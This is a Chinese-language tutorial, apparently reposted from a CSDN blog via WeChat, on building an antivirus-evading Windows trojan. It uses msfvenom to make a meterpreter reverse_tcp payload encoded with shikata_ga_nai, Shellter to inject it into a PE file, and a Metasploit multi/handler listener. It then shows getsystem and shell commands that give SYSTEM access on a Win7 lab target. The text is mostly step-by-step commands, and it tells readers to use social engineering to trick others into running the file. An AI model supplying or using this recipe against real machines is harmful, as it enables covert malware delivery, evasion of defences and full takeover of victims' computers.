<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/l2w5htlbT3TNV51PYIBwaQ)

**原理**

利用 msf 模块中的 msfvenom 模块，首先生成. exe 木马文件，用靶机打开，攻击成功后，就渗透到了靶机系统中。

**准备**

win7 靶机 ip ：192.168.56.130

kali 攻击机 ip: 192.168.56.135

## 实战开始

1. 打开 kali 机，在命令行输入：

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.135 lport=1234 -e x86/shikata_ga_nai -i 5 -f exe >/home/kali/Desktop/1.exe
```

LHOST 是主机的 ip，用来 “提醒” 木马成功后应该返回信息给自己的主机。

lport 是返回时连接的端口号，需要开启 tcp 功能，1234 端口好像默认开启？

> 后面的那一串表示木马生成的对应地址，为了方便操作我直接生成在桌面上。

-e x86/shikata_ga_nai 为使用 shikata_ga_nai 的编码方式对攻击载荷进行重新编码

-i 5 为使用刚才设定的编码方式对目标进行 5 次编码

2. 命令行输入

```
shellter
```

第一个选项选择 A

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icnwkyX1RxweCibE0IPa13OZNaedxkNtfIRxt6U8ygeTsrZbOzcPngFKliaiapsvXFDAtJ25THg5gKwUw/640?wx_fmt=png)

3.PE Target 后面填写 / home/kali/Desktop/1.exe，即木马所在路径。

然后等待一段时间 ······

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icnwkyX1RxweCibE0IPa13OZNPexw8kXibyys33EicvL3x6SJ8QoyYyb0Yia57mtI6oSGryGhyjibeIJtng/640?wx_fmt=png)

注意，虽然看着不动，但是上面那个数字一直在跳，所以不是你卡住了~

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icnwkyX1RxweCibE0IPa13OZNsyrqbr9DzvauOB5Ipicn54QVNFOicCj8xGAsqpiboDfSTdnvDd8U30b7w/640?wx_fmt=png)

4. 然后选择 Y

5. 选择 L，payload index 选择 1

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icnwkyX1RxweCibE0IPa13OZNnQJFJs4ibVibo0vP4cxrMMYCJOG7OPSBmvFjicFApYsbVI1p3o9WuRkjg/640?wx_fmt=png)

6. 设置 LHOST 以及 LPORT

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icnwkyX1RxweCibE0IPa13OZNOC3zbP7gz84zYMLWlPdap6ZGo6icZB4LdnV6spaic38g6OHQzsRoAcFA/640?wx_fmt=png)

等个大概 2 秒钟，就结束了~

免杀木马制作完成。

命令行输入

```
msfconsole
```

进入 metasploit。

然后输入

```
use exploit/multi/handler
```

开启监听模式

接下来就是设置参数了，可以使用 option 命令来查看需要设置的参数。主要设置三个：payload、LHOST、LPORT，需要跟木马一样，复制一下就行

```
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.56.135
set lport 1234
```

这里大小写随意，都可以被识别。

随后输入

```
exploit
```

执行监听命令，也就是攻击开始~

kali 端操作结束！

然后利用社会工程学等方式诱骗其他人点击这玩意，就被攻击了。

现在假装 win7 被骗了，无意中点了我的反弹木马：

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icnwkyX1RxweCibE0IPa13OZNFmRIMAzMsGmzVFEO6Zh6INgbztQfFwITToQssPStB4Rwlwmlt0ajNg/640?wx_fmt=png)

然后输入

```
shell
```

就可以获取对方管理员权限。

在输入 shell 之前，输入 getsystem，获得 system 权限以后，再输入 shell 就可以获得最高权限啦~

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icnwkyX1RxweCibE0IPa13OZNF7vDYPdCWEnhHzeC2iaIlUPOWEhYd1SZssFC4gnIBYhLthYaNfiaicTxw/640?wx_fmt=png)

使用 echo %username% 可以输出使用者的名字，这里是 SJX-PC$，如果是管理员的话，只会显示管理员账号（我这里是 “sjx”），而且，看前面的内容也可以知道是 system 权限：

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icnwkyX1RxweCibE0IPa13OZNxeDicXibdY0ayjh53EELfhFqSpn5OJfD2VPvSq6a97qr4MicibBLf6Mbicg/640?wx_fmt=png)

```
CSDN博主「imbia」原文链接：https://blog.csdn.net/satasun/article/details/105441604
```

---》  

**推荐公众号：**

  每日分享红蓝队技术文章与工具使用 下载方式、以及不定期的安全类书籍抽奖～

公众号

  

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT3KhTHWZI36e63AAqCsMmiaQUicdnhb2mlVdmdJicCeIEhmegomgcwlZpDqiaOKo2zcvM3iaqO1iciaOLibbQ/640?wx_fmt=png)